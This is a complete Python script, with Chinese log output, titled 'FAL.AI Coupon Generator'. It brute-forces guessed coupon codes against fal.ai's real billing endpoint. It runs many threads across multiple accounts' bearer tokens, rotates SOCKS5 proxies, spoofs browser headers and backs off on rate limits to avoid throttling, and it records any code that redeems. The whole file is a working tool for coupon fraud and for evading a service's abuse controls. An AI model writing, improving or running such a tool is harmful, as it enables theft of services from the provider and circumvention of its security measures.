import requests
import random
import string
import time
import threading
import os
import json
import socket
import signal
import sys
from datetime import datetime, timedelta
from itertools import cycle

# Set global socket timeout to prevent hanging connections
socket.setdefaulttimeout(30)

# Add a global flag to signal threads to stop
stop_threads = False

# Thread registry to track all running threads for clean shutdown
class ThreadRegistry:
    def __init__(self):
        self.threads = []
        self.lock = threading.Lock()
    
    def register(self, thread):
        with self.lock:
            self.threads.append(thread)
    
    def unregister(self, thread):
        with self.lock:
            if thread in self.threads:
                self.threads.remove(thread)
    
    def shutdown_all(self, timeout=2.0):
        """Signal all threads to stop and wait for them to finish"""
        global stop_threads
        stop_threads = True
        
        print("正在停止所有线程...")
        with self.lock:
            active_threads = list(self.threads)
        
        # First attempt - wait for normal termination
        end_time = time.time() + timeout
        while time.time() < end_time and any(t.is_alive() for t in active_threads):
            time.sleep(0.1)
        
        # If any threads are still alive, they're likely stuck
        still_alive = [t for t in active_threads if t.is_alive()]
        if still_alive:
            print(f"警告: {len(still_alive)} 个线程未能正常停止")
            # In Python we can't forcibly terminate threads, but we've set the flag
            # so they should exit at their next opportunity

# Create global thread registry
thread_registry = ThreadRegistry()

# Thread watchdog to detect stalled threads
class ThreadWatchdog:
    def __init__(self, timeout_seconds=60):
        self.thread_last_activity = {}
        self.lock = threading.Lock()
        self.timeout_seconds = timeout_seconds
        self.watchdog_thread = None
    
    def start(self):
        self.watchdog_thread = threading.Thread(target=self._monitor_threads, daemon=True)
        self.watchdog_thread.start()
    
    def update_activity(self, thread_id):
        with self.lock:
            self.thread_last_activity[thread_id] = time.time()
    
    def _monitor_threads(self):
        while not stop_threads:
            current_time = time.time()
            with self.lock:
                for thread_id, last_time in list(self.thread_last_activity.items()):
                    if current_time - last_time > self.timeout_seconds:
                        print(f"\n警告: 线程 {thread_id} 已经 {int(current_time - last_time)} 秒没有活动，可能已经卡住")
                        # Reset the activity timer to prevent constant warnings
                        self.thread_last_activity[thread_id] = current_time - self.timeout_seconds/2
            time.sleep(10)

# Create global watchdog
thread_watchdog = ThreadWatchdog(timeout_seconds=30)

# Global progress tracking
class ProgressTracker:
    def __init__(self):
        self.start_time = datetime.now()
        self.attempts = 0
        self.lock = threading.Lock()
        self.thread_status = {}
        self.last_summary_time = datetime.now()
        self.summary_interval = 10  # seconds
    
    def add_attempt(self):
        with self.lock:
            self.attempts += 1
    
    def update_thread_status(self, thread_id, status):
        with self.lock:
            self.thread_status[thread_id] = status
    
    def get_elapsed_time(self):
        elapsed = datetime.now() - self.start_time
        hours, remainder = divmod(elapsed.total_seconds(), 3600)
        minutes, seconds = divmod(remainder, 60)
        return f"{int(hours):02d}:{int(minutes):02d}:{int(seconds):02d}"
    
    def print_progress_summary(self, force=False):
        now = datetime.now()
        if force or (now - self.last_summary_time).total_seconds() >= self.summary_interval:
            with self.lock:
                rate = self.attempts / max(1, (now - self.start_time).total_seconds())
                print(f"\n--- 进度汇总 ---")
                print(f"运行时间: {self.get_elapsed_time()}")
                print(f"总尝试次数: {self.attempts}")
                print(f"尝试速率: {rate:.2f} 次/秒")
                print("线程状态:")
                for thread_id, status in self.thread_status.items():
                    print(f"  线程 {thread_id}: {status}")
                print("--------------\n")
                self.last_summary_time = now

# Create global progress tracker
progress_tracker = ProgressTracker()

# Class to manage tried coupon codes
class TriedCodesManager:
    def __init__(self, filename="tried_codes.txt"):
        self.filename = filename
        self.lock = threading.Lock()
        self.tried_codes = set()
        self.load_tried_codes()

    def load_tried_codes(self):
        """Load previously tried coupon codes from file"""
        if not os.path.exists(self.filename):
            with open(self.filename, "w", encoding="utf-8") as f:
                f.write("# Tried coupon codes - one per line\n")
            print(f"创建新文件 {self.filename} 用于跟踪尝试过的代码")
            return

        with open(self.filename, "r", encoding="utf-8") as f:
            for line in f:
                code = line.strip()
                if code and not code.startswith('#'):
                    self.tried_codes.add(code)
        print(f"从 {self.filename} 加载了 {len(self.tried_codes)} 个已尝试过的代码")

    def save_tried_code(self, code):
        """Save a tried code to file"""
        # Print diagnostic info before any operation
        print(f"准备保存代码 {code} 到文件 {self.filename}")

        # First check if file exists at all
        if not os.path.exists(self.filename):
            print(f"警告: 文件 {self.filename} 不存在，尝试重新创建")
            try:
                with open(self.filename, "w", encoding="utf-8") as f:
                    f.write("# Tried coupon codes - one per line\n")
                print(f"重新创建文件 {self.filename} 成功")
            except Exception as create_err:
                print(f"重新创建文件失败: {create_err}")
                # Continue anyway to try the append operation

        # Try without any unnecessary complexity first
        try:
            # Avoid lock contention by minimizing the lock scope
            with open(self.filename, "a", encoding="utf-8") as f:
                f.write(f"{code}\n")
            print(f"成功保存代码 {code} 到文件")
            return
        except Exception as simple_err:
            print(f"简单保存失败: {simple_err}，尝试更复杂的方法")
            # 以下代码会失败
        '''    def save_tried_code(self, code):
        """Save a tried code to file"""
        try:
            with self.lock:
                # Use a more robust approach for file writing
                max_retries = 3
                for attempt in range(max_retries):
                    try:
                        with open(self.filename, "a", encoding="utf-8") as f:
                            f.write(f"{code}\n")
                            f.flush()  # Ensure data is written to disk
                            os.fsync(f.fileno())  # Force OS to flush file buffers
                            print(f"保存代码到文件: {code}")
                        break  # If successful, break out of retry loop
                    except (IOError, OSError) as e:
                        if attempt < max_retries - 1:  # If not the last attempt
                            print(f"保存代码到文件时出错 (尝试 {attempt+1}/{max_retries}): {e}")
                            time.sleep(0.5)  # Short delay before retry
                        else:
                            raise  # Re-raise the exception if all retries failed
        except Exception as e:
            # Log the error but don't crash the thread
            print(f"保存代码到文件失败: {e}")'''
        # If we got here, the simple approach failed - try with more safeguards
        try:
            with self.lock:
                print(f"获取锁成功，尝试更稳健的文件写入方式")

                # Check directory exists and is writable
                directory = os.path.dirname(os.path.abspath(self.filename))
                if not os.path.exists(directory):
                    os.makedirs(directory, exist_ok=True)
                    print(f"创建目录 {directory}")

                # Check if file is writable before attempting
                if os.path.exists(self.filename):
                    if not os.access(self.filename, os.W_OK):
                        print(f"警告: 文件 {self.filename} 不可写")
                        # Still try anyway

                # Use a temporary file approach for more reliable writes
                temp_filename = f"{self.filename}.tmp"
                try:
                    # First append to a temp file
                    with open(temp_filename, "a", encoding="utf-8") as temp_f:
                        temp_f.write(f"{code}\n")
                        temp_f.flush()

                    # Then append that content to the main file
                    with open(self.filename, "a", encoding="utf-8") as main_f:
                        main_f.write(f"{code}\n")
                        main_f.flush()

                    # Clean up temp file
                    if os.path.exists(temp_filename):
                        os.remove(temp_filename)

                    print(f"使用临时文件方式成功保存代码 {code}")
                    return
                except Exception as temp_err:
                    print(f"临时文件方式失败: {temp_err}")
                    # Clean up any leftover temp file
                    if os.path.exists(temp_filename):
                        try:
                            os.remove(temp_filename)
                        except:
                            pass

                # As a last resort, try a direct batched write
                print("尝试最后的直接写入方式")
                with open(self.filename, "a", encoding="utf-8") as f:
                    f.write(f"{code}\n")
                    # Don't use fsync as it may be causing issues
                print(f"直接写入方式可能成功")

        except Exception as e:
            print(f"所有保存尝试都失败了: {e}")
            # Since we weren't able to save to file, log this prominently
            print(f"!!!警告!!! 代码 {code} 未能保存到文件，但已添加到内存中")

    def is_tried(self, code):
        """Check if a code has been tried before"""
        with self.lock:
            return code in self.tried_codes

    def add_code(self, code):
        """Mark a code as tried and save it"""
        with self.lock:
            self.tried_codes.add(code)
            self.save_tried_code(code)

# Rate limit backoff settings
class BackoffSettings:
    def __init__(self, initial_delay=1.0, max_delay=60.0, backoff_factor=2.0):
        self.initial_delay = initial_delay
        self.max_delay = max_delay
        self.backoff_factor = backoff_factor
        self.delay = initial_delay
        self.retries = 0
    
    def increase_backoff(self):
        """Increase the backoff delay using exponential backoff"""
        self.retries += 1
        self.delay = min(self.initial_delay * (self.backoff_factor ** self.retries), self.max_delay)
        return self.delay
    
    def reset(self):
        """Reset backoff settings"""
        self.delay = self.initial_delay
        self.retries = 0


class ProxyManager:
    def __init__(self, proxy_file="proxies.txt"):
        self.proxies = self.load_proxies(proxy_file)
        self.proxy_cycle = cycle(self.proxies) if self.proxies else None
        self.proxy_lock = threading.Lock()
        
    def load_proxies(self, filename):
        """Load proxies from a file"""
        if not os.path.exists(filename):
            with open(filename, "w", encoding="utf-8") as f:
                f.write("# Add your proxies here, one per line in format: http://ip:port or http://user:pass@ip:port\n")
            return []
            
        proxies = []
        with open(filename, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    proxies.append(line)
        return proxies
    
    def get_proxy(self):
        """Get next proxy from rotation"""
        if not self.proxies:
            return None
            
        with self.proxy_lock:
            proxy_str = next(self.proxy_cycle)
            
            if proxy_str.count(':') == 3:
                ip, port, username, password = proxy_str.split(':')
                return f"socks5://{username}:{password}@{ip}:{port}"
            elif proxy_str.count(':') == 1:
                return f"socks5://{proxy_str}"
            elif proxy_str.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
                return proxy_str
            else:
                return f"socks5://{proxy_str}"


def generate_random_string(length=5):
    return "".join(random.choice(string.ascii_lowercase) for _ in range(length))


def save_successful_code(coupon_code, response_data):
    """Save successful coupon code to a file with timestamp"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    os.makedirs("successful_codes", exist_ok=True)
    filename = os.path.join(
        "successful_codes", f"success_{datetime.now().strftime('%Y%m%d')}.txt"
    )
    with open(filename, "a", encoding="utf-8") as f:
        f.write(f"[{timestamp}] Code: {coupon_code}\n")
        f.write(f"Response: {json.dumps(response_data, ensure_ascii=False)}\n")
        f.write("-" * 50 + "\n")

    print(f"Successfully saved code {coupon_code} to {filename}")


# Add a class to track account success status
class AccountManager:
    def __init__(self):
        self.successful_accounts = set()
        self.lock = threading.Lock()
    
    def mark_successful(self, bearer_token):
        """Mark an account as having successfully used a coupon"""
        with self.lock:
            # Store just a short hash of the token for privacy
            token_hash = hash(bearer_token) % 10000000
            self.successful_accounts.add(token_hash)
            # Also save to disk for persistence across runs
            self._save_successful_accounts()
    
    def is_successful(self, bearer_token):
        """Check if an account has already successfully used a coupon"""
        with self.lock:
            token_hash = hash(bearer_token) % 10000000
            return token_hash in self.successful_accounts
    
    def _save_successful_accounts(self):
        """Save successful accounts to file"""
        try:
            with open("successful_accounts.txt", "w", encoding="utf-8") as f:
                for token_hash in self.successful_accounts:
                    f.write(f"{token_hash}\n")
        except Exception as e:
            print(f"保存成功账号记录失败: {e}")
    
    def load_successful_accounts(self):
        """Load successful accounts from file"""
        try:
            if os.path.exists("successful_accounts.txt"):
                with open("successful_accounts.txt", "r", encoding="utf-8") as f:
                    for line in f:
                        try:
                            token_hash = int(line.strip())
                            self.successful_accounts.add(token_hash)
                        except ValueError:
                            # Skip invalid lines
                            continue
                print(f"已加载 {len(self.successful_accounts)} 个成功使用过优惠码的账号")
        except Exception as e:
            print(f"加载成功账号记录失败: {e}")

# Create global account manager
account_manager = AccountManager()

# Custom thread class that registers itself
class MonitoredThread(threading.Thread):
    def __init__(self, target, args=(), kwargs=None, daemon=False):
        if kwargs is None:
            kwargs = {}
        super().__init__(target=target, args=args, kwargs=kwargs, daemon=daemon)
        self._stop_event = threading.Event()
        
    def run(self):
        global thread_registry
        # Register when starting
        thread_registry.register(self)
        try:
            super().run()
        finally:
            # Unregister when finished
            thread_registry.unregister(self)
            
    def raise_exception(self):
        # This is a placeholder - Python doesn't provide a clean way to interrupt threads
        # The thread should check stop_threads regularly
        pass


def setup_signal_handlers():
    """Set up handlers for signals like SIGINT (Ctrl+C)"""
    def signal_handler(sig, frame):
        global stop_threads
        if stop_threads:
            # If Ctrl+C is pressed a second time, exit immediately
            print("\n\n强制退出程序!")
            os._exit(1)  # Force exit without cleanup
        
        print("\n\n接收到停止信号，正在安全停止所有线程...")
        stop_threads = True
        
        # Try to cleanly shut down all threads
        try:
            thread_registry.shutdown_all(timeout=3.0)
            progress_tracker.print_progress_summary(force=True)
            print(f"程序已停止，总运行时间: {progress_tracker.get_elapsed_time()}")
            print(f"结束时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        except Exception as e:
            print(f"清理过程中发生错误: {e}")
        
        # Exit more forcefully, but still give a chance for cleanup
        os._exit(0)
        
    # Register handler for keyboard interrupt
    signal.signal(signal.SIGINT, signal_handler)
    if hasattr(signal, 'SIGBREAK'):  # Windows Ctrl+Break
        signal.signal(signal.SIGBREAK, signal_handler)
    if hasattr(signal, 'SIGTERM'):  # Termination signal
        signal.signal(signal.SIGTERM, signal_handler)


def try_coupon_codes(bearer_token, thread_id, tried_codes_manager, proxy_manager=None):
    """Function to try coupon codes for a specific account with proxy support"""
    global progress_tracker, thread_watchdog, account_manager
    
    # Check if this account has already successfully used a coupon
    if account_manager.is_successful(bearer_token):
        print(f"Thread {thread_id}: 该账号已成功使用过优惠码，跳过")
        progress_tracker.update_thread_status(thread_id, "账号已成功使用优惠码")
        return
    
    print(f"Thread {thread_id} started with token: {bearer_token[:10]}...")
    
    # Initialize the activity tracking for this thread
    thread_watchdog.update_activity(thread_id)
    
    backoff = BackoffSettings()
    attempts_count = 0
    
    # Track start time to calculate actual request time
    iteration_start_time = time.time()

    try:
        while not stop_threads:
            # Update watchdog to indicate thread activity
            thread_watchdog.update_activity(thread_id)
            
            # Calculate time taken for the last iteration
            iteration_time = time.time() - iteration_start_time
            if iteration_time > 5:  # If last iteration took more than 5 seconds, log it
                print(f"Thread {thread_id}: 警告 - 上一次迭代耗时 {iteration_time:.1f} 秒")
            
            # Start timing this iteration
            iteration_start_time = time.time()
            
            progress_tracker.update_thread_status(thread_id, "正在生成新代码")
            
            try:
                # Get proxy with timeout check
                proxy_start = time.time()
                proxy = None
                if proxy_manager:
                    proxy = proxy_manager.get_proxy()
                    if proxy:
                        proxy_time = time.time() - proxy_start
                        if proxy_time > 1:  # Log if getting proxy took more than 1 second
                            print(f"Thread {thread_id}: 获取代理耗时 {proxy_time:.1f} 秒")
                        print(f"Thread {thread_id} using proxy: {proxy}")
                
                # Generate random code with timeout check
                gen_start = time.time()
                random_part = generate_random_string()
                gen_time = time.time() - gen_start
                if gen_time > 0.5:  # Log if code generation took more than 0.5 seconds
                    print(f"Thread {thread_id}: 生成随机码耗时 {gen_time:.1f} 秒")
                
                # Skip if code was tried before
                if tried_codes_manager.is_tried(random_part):
                    print(f"Thread {thread_id}: 跳过已尝试过的代码: {random_part}")
                    progress_tracker.update_thread_status(thread_id, f"跳过已尝试过的代码: {random_part}")
                    continue
                else:
                    print(f"Thread {thread_id}: 生成的新代码: {random_part}")
                # Save new code with timeout check
                save_start = time.time()
                tried_codes_manager.add_code(random_part)
                save_time = time.time() - save_start
                if save_time > 1:  # Log if saving code took more than 1 second
                    print(f"Thread {thread_id}: 保存尝试代码耗时 {save_time:.1f} 秒")
                
                # Update attempt counters
                attempts_count += 1
                progress_tracker.add_attempt()
                
                # Prepare request parameters
                coupon_code = f"_eleven50_{random_part}"
                print(f"Thread {thread_id}: 生成的代码: {coupon_code}")
                url = f"https://rest.alpha.fal.ai/billing/coupon/{coupon_code}"
                headers = {
                    "Host": "rest.alpha.fal.ai",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0",
                    "Accept": "application/json",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Accept-Encoding": "gzip, deflate, br, zstd",
                    "Referer": "https://fal.ai/",
                    "authorization": f"Bearer {bearer_token}",
                    "Origin": "https://fal.ai",
                    "DNT": "1",
                    "Sec-GPC": "1",
                    "Connection": "keep-alive",
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-site",
                }
                
                proxies = {"http": proxy, "https": proxy} if proxy else None
                
                # Make the request with robust error handling
                try:
                    thread_watchdog.update_activity(thread_id)
                    progress_tracker.update_thread_status(thread_id, f"尝试代码: {random_part}")
                    print(f"Thread {thread_id}: 正在请求 {random_part}...", flush=True)
                    
                    # Debug info
                    print(f"Thread {thread_id}: URL={url}, Proxy={proxy}")
                    
                    # Try request with shorter timeout
                    start_time = time.time()
                    response = requests.post(
                        url, 
                        headers=headers, 
                        proxies=proxies, 
                        timeout=8,  # Shorter timeout to detect problems faster
                        verify=True
                    )
                    request_time = time.time() - start_time
                    print(f"Thread {thread_id}: 请求完成，耗时 {request_time:.2f}秒，状态码: {response.status_code}")
                    
                    # Update watchdog after successful request
                    thread_watchdog.update_activity(thread_id)
                    
                    # Process response
                    try:
                        response_data = response.json()                        
                        if response.status_code == 200:
                            progress_tracker.update_thread_status(thread_id, f"成功! 兑换码 {random_part} 正确")
                            print(f"\nThread {thread_id}: 成功! 兑换码 {random_part} 正确")
                            print("Response:", response_data)
                            save_successful_code(random_part, response_data)
                            # Mark this account as successful
                            account_manager.mark_successful(bearer_token)
                            print(f"Thread {thread_id}: 该账号已标记为成功，将不再使用")
                            break
                        else:
                            # Log detailed response info
                            print(f"Thread {thread_id}: 请求失败，状态码: {response.status_code}")
                            print(f"响应头: {response.headers}")
                            
                            if "detail" in response_data and response_data["detail"] == "Coupon not found":
                                progress_tracker.update_thread_status(thread_id, f"失败，尝试新代码 (已尝试: {attempts_count})")
                                backoff.reset()
                            elif "detail" in response_data and "rate limit" in response_data["detail"].lower():
                                wait_time = backoff.increase_backoff()
                                progress_tracker.update_thread_status(thread_id, f"遇到限流! 等待 {wait_time:.1f} 秒")
                                print(f"\nThread {thread_id}: 遇到限流! 等待 {wait_time:.1f} 秒后重试...")
                                
                                if stop_threads:
                                    break
                                time.sleep(wait_time)
                                continue
                            else:
                                progress_tracker.update_thread_status(thread_id, f"未知错误: {random_part}")
                                print(f"\nThread {thread_id}: 未知错误 {random_part}:")
                                print(f"响应内容: {response_data}")
                                if backoff.retries == 0:
                                    backoff.increase_backoff()
                        
                    except json.JSONDecodeError:
                        print(f"Thread {thread_id}: 响应不是有效的 JSON: {response.text[:100]}")
                        response_data = {"error": "Invalid JSON response"}
                        time.sleep(1)  # Brief pause before next attempt
                        continue
                    
                except requests.exceptions.RequestException as e:
                    # Update watchdog to indicate thread is still active despite error
                    thread_watchdog.update_activity(thread_id)
                    progress_tracker.update_thread_status(thread_id, f"请求失败: {str(e)[:30]}...")
                    print(f"\nThread {thread_id}: 请求失败: {type(e).__name__}: {e}")
                    
                    # Handle specific errors
                    if isinstance(e, requests.exceptions.ProxyError):
                        print(f"代理连接失败，请检查代理设置: {proxy}")
                    elif isinstance(e, requests.exceptions.ConnectionError):
                        print(f"连接错误，可能是网络问题或服务器拒绝连接")
                    elif isinstance(e, requests.exceptions.Timeout):
                        print(f"请求超时，服务器响应时间过长")
                    
                    # Implement backoff and retry
                    wait_time = backoff.increase_backoff()
                    print(f"等待 {wait_time:.1f} 秒后重试...")
                    if stop_threads:
                        break
                    time.sleep(wait_time)
                    continue
                
                # Update watchdog before next iteration
                thread_watchdog.update_activity(thread_id)
                
                # Brief pause between attempts
                if not stop_threads:
                    time.sleep(0.5)
                
            except Exception as inner_e:
                # This catches any other exceptions in the main loop
                thread_watchdog.update_activity(thread_id)
                print(f"Thread {thread_id}: 内部循环异常: {type(inner_e).__name__}: {inner_e}")
                time.sleep(1)  # Brief pause before next attempt
        
    except Exception as e:
        # This catches exceptions outside the main loop
        progress_tracker.update_thread_status(thread_id, f"错误: {str(e)[:30]}...")
        print(f"\nThread {thread_id}: 主循环异常: {e}")

    # Final update before thread exits
    progress_tracker.update_thread_status(thread_id, "已停止")
    print(f"Thread {thread_id} stopping...")


def load_tokens_from_file(filename="tokens.txt"):
    if not os.path.exists(filename):
        with open(filename, "w", encoding="utf-8") as f:
            f.write("# Add your bearer tokens here, one per line\n")
        return []

    tokens = []
    with open(filename, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                tokens.append(line)
    return tokens


def main():
    global stop_threads, progress_tracker, thread_watchdog, account_manager
    
    # Set up signal handlers for clean exit
    setup_signal_handlers()
    
    print("FAL.AI Coupon Generator")
    print(f"开始时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

    progress_tracker = ProgressTracker()
    
    # Start the watchdog
    thread_watchdog.start()
    print("线程监控已启动，将检测卡住的线程")

    tried_codes_manager = TriedCodesManager()
    print(f"已加载 {len(tried_codes_manager.tried_codes)} 个已尝试过的代码")

    proxy_manager = ProxyManager()
    if proxy_manager.proxies:
        print(f"已加载 {len(proxy_manager.proxies)} 个代理")
    else:
        print("未找到代理配置。请在proxies.txt中添加代理，每行一个。")
        use_proxy = input("是否继续不使用代理? (y/n): ").strip().lower()
        if use_proxy != 'y':
            print("退出程序")
            return
        proxy_manager = None

    # Load previously successful accounts
    account_manager.load_successful_accounts()

    print("\n选择模式:")
    print("1. 单账号模式")
    print("2. 多账号模式 (从tokens.txt加载)")

    choice = '2'
    threads = []

    try:
        if choice == "1":
            bearer_token = input("输入你的Bearer Token: ").strip()
            thread = MonitoredThread(
                target=try_coupon_codes, 
                args=(bearer_token, 1, tried_codes_manager, proxy_manager)
            )
            threads.append(thread)
            thread.start()

            # Use safer monitoring loop
            while not stop_threads and thread.is_alive():
                try:
                    progress_tracker.print_progress_summary()
                    time.sleep(1)
                except KeyboardInterrupt:
                    # Let the signal handler deal with it
                    pass

        elif choice == "2":
            tokens = load_tokens_from_file()
            if not tokens:
                print("未找到令牌。请在tokens.txt中添加Bearer Tokens，每行一个。")
                return

            print(f"已加载 {len(tokens)} 个账号")

            for i, token in enumerate(tokens):
                thread = MonitoredThread(
                    target=try_coupon_codes, 
                    args=(token, i + 1, tried_codes_manager, proxy_manager)
                )
                threads.append(thread)
                thread.start()
                time.sleep(0.5)

            # Monitoring loop with better error handling
            while not stop_threads and any(t.is_alive() for t in threads):
                try:
                    progress_tracker.print_progress_summary()
                    
                    # Report if no progress is being made
                    if progress_tracker.attempts == 0 and time.time() - progress_tracker.start_time.timestamp() > 30:
                        print("\n警告: 30秒内没有尝试任何代码，可能存在连接问题!")
                        print("请检查代理设置和网络连接...")
                    
                    time.sleep(1)
                except KeyboardInterrupt:
                    # Let the signal handler deal with it
                    pass
                except Exception as e:
                    print(f"监控循环异常: {e}")
                    time.sleep(1)

        else:
            print("无效的选择，请输入1或2。")

    except KeyboardInterrupt:
        # Let the signal handler deal with it
        pass
    except Exception as e:
        print(f"主程序异常: {e}")
    
    # Make sure we shut down properly
    thread_registry.shutdown_all()
    print(f"程序已停止，总运行时间: {progress_tracker.get_elapsed_time()}")

if __name__ == "__main__":
    try:
        # Set smaller buffer size to flush output more frequently
        import sys
        sys.stdout.reconfigure(line_buffering=True)
    except AttributeError:
        # For Python versions that don't support reconfigure
        import functools
        print = functools.partial(print, flush=True)
    
    main()
